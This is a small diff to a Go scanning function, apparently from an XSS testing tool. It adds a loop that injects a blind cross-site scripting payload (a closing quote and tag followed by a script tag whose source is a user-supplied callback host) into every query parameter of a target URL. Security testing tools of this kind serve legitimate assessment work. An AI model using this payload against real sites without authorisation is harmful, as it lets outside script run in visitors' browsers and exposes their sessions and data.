@@ -99,6 +99,14 @@ func Scan(target string, options_string map[string]string, options_bool map[stri
 			}
 		}
 
+		// Static payload
+		spu, _ := url.Parse(target)
+		spd := spu.Query()
+		for spk, _ := range spd {
+			tq := MakeRequestQuery(target, spk, "\"'><script src="+options_string["blind"]+"></script>")
+			tm := map[string]string{spk: "toBlind"}
+			query[tq] = tm
+		}
 		//fmt.Println(query)
 		gologger.Infof("Start XSS Scanning")
 		task := 1
